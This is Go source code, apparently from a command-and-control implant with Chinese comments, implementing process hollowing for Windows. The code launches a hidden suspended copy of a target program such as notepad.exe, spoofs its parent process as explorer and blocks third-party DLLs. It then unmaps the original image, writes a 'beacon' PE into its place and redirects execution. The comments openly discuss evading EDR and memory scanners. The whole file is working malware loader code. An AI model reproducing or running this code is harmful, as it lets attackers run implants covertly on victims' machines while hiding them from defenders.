//go:build windows

package commands

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ===== A10: Process Hollowing（进程镂空） =====
// 以目标进程的镜像路径创建新进程（CREATE_SUSPENDED），卸载其原镜像，
// 写入完整 beacon PE，改入口点后恢复执行--beacon 作为"正常进程"运行，
// Go runtime 正常初始化 -> 可靠上线（进程名伪装为目标进程，如 notepad.exe）。
// 不触碰原目标进程（不会崩溃/蓝屏）。
//
// 与 donut 远程线程反射加载相比：完整 Go PE 反射加载到远程进程不可靠（Go runtime
// 依赖正常进程初始化），hollow 以新进程加载规避了该问题。
//
// 【OPSEC：W^X】镜像内存一律先申请 RW，写入完成后只把**可执行节**收紧为 RX
// （hardenImage）。此前整块申请 PAGE_EXECUTE_READWRITE —— 那种 RWX 区块本身就是
// EDR/内存扫描器最醒目的特征，也与注入链"RW→RX"的原则相矛盾。

type peSectionInfo struct {
	virtualAddress  uint32
	virtualSize     uint32
	rawSize         uint32
	characteristics uint32
	data            []byte
}

type peImageInfo struct {
	imageBase           uintptr
	sizeOfImage         uint32
	addressOfEntryPoint uint32
	sizeOfHeaders       uint32
	// hasReloc 镜像带 .reloc 且内容非空 —— 只有这种情况"不在 preferred base"才真的需要
	// loader 就地写重定位（进而需要可执行节暂时可写）。
	hasReloc bool
	sections []peSectionInfo
}

// ProcessHollow 进程镂空：注入完整 beacon PE，以目标 pid 的镜像路径创建新进程运行。
//
// 【关键机制】CREATE_SUSPENDED 子进程恢复执行时，loader 初始化 APC（LdrInitializeThunk）
// 先于用户入口运行，并以 PEB->ImageBaseAddress 定位主镜像：解析导入表(IAT)、注册
// .pdata 异常表、必要时应用重定位。因此镂空的正确顺序是：
//  1. 从子进程 PEB 读取原镜像【实际】基址（ASLR 下 ≠ 文件 preferred base）并卸载之；
//  2. 分配 beacon（优先 preferred base，回退任意地址，.reloc 交由 loader 重定位）；
//  3. 【无条件】把 PEB->ImageBaseAddress 更新为 beacon 实际基址；
//  4. 写 PE 头 + 各节，改主线程 RIP = 实际基址 + 入口 RVA，ResumeThread。
//
// 历史缺陷（已修）：曾用 beacon preferred ImageBase(0x140000000) 做卸载、且仅在分配
// 地址 != preferred base 时才更新 PEB -- ASLR 目标(如 notepad)原镜像在随机基址，
// 卸载失败原镜像残留，loader 初始化的是原镜像而非 beacon，beacon IAT 未解析、
// Go runtime 首次经 IAT 调 kernel32 即崩溃 -> 注入报成功但永远不上线。
func ProcessHollow(pid int, peData []byte) error {
	if len(peData) < 2 || peData[0] != 'M' || peData[1] != 'Z' {
		return errors.New("载荷不是有效 PE（缺 MZ 头）")
	}
	imgPath, err := getProcessImagePath(pid)
	if err != nil {
		return fmt.Errorf("读取目标进程路径失败: %v", err)
	}
	info, err := parsePEImage(peData)
	if err != nil {
		return err
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createProcessW := kernel32.NewProc("CreateProcessW")
	getThreadContext := kernel32.NewProc("GetThreadContext")
	setThreadContext := kernel32.NewProc("SetThreadContext")
	resumeThread := kernel32.NewProc("ResumeThread")
	isWow64Process := kernel32.NewProc("IsWow64Process")
	getExitCodeProcess := kernel32.NewProc("GetExitCodeProcess")
	closeHandle := kernel32.NewProc("CloseHandle")

	// 1. CreateProcessW 挂起创建新进程（同路径 -> 进程名伪装为目标进程）
	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0     // SW_HIDE
	var pi syscall.ProcessInformation
	appPtr, _ := syscall.UTF16PtrFromString(imgPath)
	const createSuspended = 0x08000000
	const extendedStartupInfoPresent = 0x00080000

	// 父进程伪造 + BlockDLLs：孩子一出生，EPROCESS 里的父进程字段就是 explorer，
	// 之后的任务管理器/进程树重建只能看到伪造结果。取不到属性时退化为普通创建。
	ca := newChildAttrs()
	defer ca.Close()
	siEx := startupInfoExW{StartupInfo: si}
	flags := uint32(createSuspended)
	lpSi := uintptr(unsafe.Pointer(&siEx))
	if ca != nil && ca.list != nil {
		siEx.ProcThreadAttributeList = uintptr(unsafe.Pointer(ca.list.List()))
		siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
		flags |= extendedStartupInfoPresent
	}
	r, _, _ := createProcessW.Call(
		uintptr(unsafe.Pointer(appPtr)), 0, 0, 0, 0,
		uintptr(flags), 0, 0,
		lpSi, uintptr(unsafe.Pointer(&pi)))
	if r == 0 {
		return fmt.Errorf("CreateProcessW(%s) 失败", imgPath)
	}
	defer closeHandle.Call(uintptr(pi.Thread))
	defer closeHandle.Call(uintptr(pi.Process))

	// 1.5 位数校验：64 位 beacon 镂空进 32 位(Wow64)子进程必然崩溃，提前拒绝
	var childWow64 uint32
	if r, _, _ := isWow64Process.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&childWow64))); r != 0 && childWow64 != 0 {
		return errors.New("目标进程为 32 位(Wow64)，镂空注入仅支持 64 位目标进程，请选择 64 位目标")
	}

	// 远端内存原语：syscall 模式优先 NtXxx trampoline，失败逐项回退 kernel32/ntdll。
	rm := newRemoteMemory()
	procHandle := uintptr(pi.Process)

	// 2. 读取子进程 PEB 中的原镜像实际基址（ASLR 随机化后与 preferred base 不同）
	//    并卸载该基址上的原镜像。PROCESS_BASIC_INFORMATION x64: PebBaseAddress 在 +0x8。
	pebAddr, err := rm.PEBAddress(procHandle)
	if err != nil {
		return fmt.Errorf("读取子进程 PEB 失败: %v", err)
	}
	origBaseRaw, err := rm.Read(procHandle, pebAddr+0x10, 8)
	if err != nil || len(origBaseRaw) != 8 {
		return errors.New("读取原镜像基址失败")
	}
	origBase := uintptr(binary.LittleEndian.Uint64(origBaseRaw))

	// 极少见：读到的基址未被映射。失败也继续（下面按"分配失败"处理）
	unmapStatus, unmapErr := rm.Unmap(procHandle, origBase)
	_ = unmapErr

	// 3. 预留镜像内存：一律 RW（不申请 RWX；执行保护由 hardenImage 收紧）
	addr, fellBack, err := reserveImage(rm, procHandle, info)
	if err != nil {
		return fmt.Errorf("%v (unmap=0x%x)", err, unmapStatus)
	}

	// 4. 无条件更新 PEB->ImageBaseAddress = beacon 实际基址：
	//    loader 初始化 APC 以该字段定位主镜像，解析 IAT / 注册异常表 / 重定位。
	var ibRaw [8]byte
	binary.LittleEndian.PutUint64(ibRaw[:], uint64(addr))
	if _, err := rm.Write(procHandle, pebAddr+0x10, ibRaw[:]); err != nil {
		return fmt.Errorf("更新 PEB ImageBaseAddress 失败: %v", err)
	}

	// 5. 写 PE 头 + 各节
	if err := writeImage(rm, procHandle, addr, info, peData); err != nil {
		return fmt.Errorf("%v (unmap=0x%x)", err, unmapStatus)
	}

	// 5.5 收紧可执行节（RW → RX）：写入阶段结束，执行期不再可写。
	//     只有"镜像不在 preferred base 且带重定位表"时才保留可执行节的写权限，
	//     因为 loader 会在 ResumeThread 之后就地把重定位写进 .text。
	needReloc := fellBack && info.hasReloc
	protNotes, err := hardenImage(rm, procHandle, addr, info, needReloc)
	if err != nil {
		return err
	}

	// 6. 设置主线程入口点 RIP = 实际基址 + AddressOfEntryPoint
	//    x64 CONTEXT: ContextFlags@0x30, Rip@0xF8；结构要求 16 字节对齐
	//    （Go 分配仅保证 8 字节，未对齐会偶发 GetThreadContext 失败/上下文损坏）
	ctxRaw := make([]byte, 0x4D0+16)
	align := int((16 - (uintptr(unsafe.Pointer(&ctxRaw[0])) & 15)) & 15)
	ctx := ctxRaw[align : align+0x4D0]
	binary.LittleEndian.PutUint32(ctx[0x30:], 0x00100007) // CONTEXT_AMD64 | CONTEXT_FULL (0x10007)
	r, _, _ = getThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
	if r == 0 {
		return errors.New("GetThreadContext 失败")
	}
	entry := uint64(addr) + uint64(info.addressOfEntryPoint)
	binary.LittleEndian.PutUint64(ctx[0xF8:], entry)
	if r, _, _ = setThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0]))); r == 0 {
		return errors.New("SetThreadContext 失败")
	}

	// 7. 恢复执行 -> loader 先初始化 beacon（IAT/异常表/重定位），随后进入 beacon 入口
	var resumeRet uintptr
	if resumeRet, _, _ = resumeThread.Call(uintptr(pi.Thread)); resumeRet == 0xFFFFFFFF {
		return errors.New("ResumeThread 失败")
	}

	// 诊断：短暂等待后读取新进程退出码（259=STILL_ACTIVE 运行中；否则为崩溃退出码）
	time.Sleep(1500 * time.Millisecond)
	protNote := strings.Join(protNotes, ",")
	diag := fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x reloc=%v backend=%s prot=[%s] attrs=%s",
		origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint, needReloc, rm.Backend(), protNote, ca.Describe())
	var exitCode uint32
	if r, _, _ = getExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode))); r != 0 {
		hollowLastResult = diag + fmt.Sprintf(" exit=0x%x alive=%v", exitCode, exitCode == 259)
		if exitCode != 259 {
			// 注入操作本身成功但 beacon 启动即崩溃：显式报错（而非假成功），
			// 把退出码带回控制台便于定位（0xC0000005=IAT/重定位问题）
			return fmt.Errorf("beacon 进程启动后即退出 (exit=0x%x)：%s", exitCode, hollowLastResult)
		}
	} else {
		hollowLastResult = diag + " exit=GetExitCodeFailed"
	}
	return nil
}

// hollowLastResult 保存最近一次 hollow 的诊断信息（供回包展示）
var hollowLastResult string

// SetHollowDiag 由 CmdInjectMem 调用获取 hollow 诊断
func SetHollowDiag(d string) { hollowLastResult = d }

// GetHollowDiag 返回 hollow 诊断
func GetHollowDiag() string { return hollowLastResult }

// getProcessImagePath 读取指定 PID 进程的镜像路径（QueryFullProcessImageNameW）。
func getProcessImagePath(pid int) (string, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	queryFullProcessImageName := kernel32.NewProc("QueryFullProcessImageNameW")
	closeHandle := kernel32.NewProc("CloseHandle")

	const processQueryLimitedInformation = 0x1000
	h, _, _ := openProcess.Call(processQueryLimitedInformation, 0, uintptr(pid))
	if h == 0 {
		return "", fmt.Errorf("OpenProcess(%d) 失败", pid)
	}
	defer closeHandle.Call(h)

	buf := make([]uint16, 1024)
	size := uint32(len(buf))
	r, _, _ := queryFullProcessImageName.Call(
		h, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return "", fmt.Errorf("QueryFullProcessImageName 失败")
	}
	return syscall.UTF16ToString(buf[:size]), nil
}

// parsePEImage 解析 64 位 PE 的关键字段（ImageBase/SizeOfImage/入口/节表）。
func parsePEImage(data []byte) (*peImageInfo, error) {
	f, err := pe.NewFile(bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("解析 PE 失败: %v", err)
	}
	opt64, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return nil, errors.New("非 64 位 PE（hollow 仅支持 x64 beacon）")
	}
	info := &peImageInfo{
		imageBase:           uintptr(opt64.ImageBase),
		sizeOfImage:         opt64.SizeOfImage,
		addressOfEntryPoint: opt64.AddressOfEntryPoint,
		sizeOfHeaders:       opt64.SizeOfHeaders,
	}
	if info.sizeOfImage == 0 || info.sizeOfHeaders == 0 {
		return nil, errors.New("PE 尺寸字段无效")
	}
	for _, s := range f.Sections {
		secData, _ := s.Data()
		info.sections = append(info.sections, peSectionInfo{
			virtualAddress:  s.VirtualAddress,
			virtualSize:     s.VirtualSize,
			rawSize:         s.Size,
			characteristics: s.Characteristics,
			data:            secData,
		})
		if s.Name == ".reloc" && len(secData) > 0 {
			info.hasReloc = true
		}
	}
	return info, nil
}

// ===== 镂空的内存布局步骤（抽出来是为了能被单测钉住）=====

// reserveImage 为镂空镜像预留内存：优先 preferred ImageBase（无需重定位，
// loader 不会往 .text 写），失败才退任意地址。
//
// 分配一律 PAGE_READWRITE —— 没有任何一页是"一分配就可执行"的；
// 执行保护由 hardenImage 在写入完成后收紧。
// 返回的 fellBack 表示"没能拿到 preferred base"，是后面判断是否需要重定位的依据。
func reserveImage(rm remoteMemory, h uintptr, info *peImageInfo) (addr uintptr, fellBack bool, err error) {
	size := uintptr(info.sizeOfImage)
	addr, err = rm.Alloc(h, info.imageBase, size, pageReadWrite)
	if err == nil && addr != 0 {
		return addr, addr != info.imageBase, nil
	}
	addr, err = rm.Alloc(h, 0, size, pageReadWrite)
	if err != nil || addr == 0 {
		if err == nil {
			err = errors.New("分配返回 0 且无错误")
		}
		return 0, true, fmt.Errorf("为镜像预留内存失败: %v", err)
	}
	return addr, addr != info.imageBase, nil
}

// writeImage 把 PE 头与各节写进已预留的内存（写入期内存仍是 RW）。
func writeImage(rm remoteMemory, h, base uintptr, info *peImageInfo, peData []byte) error {
	if uintptr(info.sizeOfHeaders) > uintptr(len(peData)) {
		return errors.New("PE 头长度超出载荷数据")
	}
	if _, err := rm.Write(h, base, peData[:info.sizeOfHeaders]); err != nil {
		return fmt.Errorf("写 PE 头失败: %v", err)
	}
	for _, sec := range info.sections {
		if len(sec.data) == 0 {
			continue
		}
		if _, err := rm.Write(h, base+uintptr(sec.virtualAddress), sec.data); err != nil {
			return fmt.Errorf("写节失败 va=0x%x: %v", sec.virtualAddress, err)
		}
	}
	return nil
}

// hardenImage 收紧**可执行节**：RW → RX（写入阶段已结束）。
//
// 为什么只动可执行节、非可执行节保持 RW（这是与本项目"注入走 RW→RX"一致的取舍，
// 但镂空比注入多一层限制，必须说清楚）：
//
//	镂空用的是私有内存（VirtualAllocEx），不是 SEC_IMAGE 映射，因此没有写时复制兜底。
//	loader 在 ResumeThread 之后才解析导入表，它要**写** IAT（通常落在 .rdata），
//	Go runtime 还要写 .data 里的全局。把这些页先设为只读，loader 会在 IAT 写入处
//	访问违例 —— 症状是"注入报成功、beacon 启动即 0xC0000005 退出"。
//	所以真正被消除的是 RWX：**没有任何可执行页同时可写**。
//
// relocating=true 时（镜像不在 preferred base 且带重定位表），可执行节必须保留写权限：
// 重定位写发生在 ResumeThread 之后、beacon 入口之前，且不经过我们的代码。
// 这条路径会出现在回包诊断里（prot=[...RWX(重定位期)]），不是静默降级。
func hardenImage(rm remoteMemory, h, base uintptr, info *peImageInfo, relocating bool) ([]string, error) {
	var notes []string
	for _, sec := range info.sections {
		if sec.characteristics&scnMemExecute == 0 {
			continue
		}
		size := uintptr(sec.virtualSize)
		if size == 0 {
			size = uintptr(sec.rawSize)
		}
		if size == 0 {
			continue
		}
		// 不越过镜像边界（末节的 VirtualSize 可能超出 SizeOfImage 的余量）
		off := uintptr(sec.virtualAddress)
		if off+size > uintptr(info.sizeOfImage) {
			if off >= uintptr(info.sizeOfImage) {
				continue
			}
			size = uintptr(info.sizeOfImage) - off
		}
		prot := uint32(pageExecuteRead)
		label := "RX"
		if relocating {
			prot = pageExecuteReadWrite
			label = "RWX(重定位期)"
		}
		if _, err := rm.Protect(h, base+off, size, prot); err != nil {
			return notes, fmt.Errorf("收紧节保护失败 va=0x%x: %v", sec.virtualAddress, err)
		}
		notes = append(notes, fmt.Sprintf("va=0x%x=%s", sec.virtualAddress, label))
	}
	return notes, nil
}
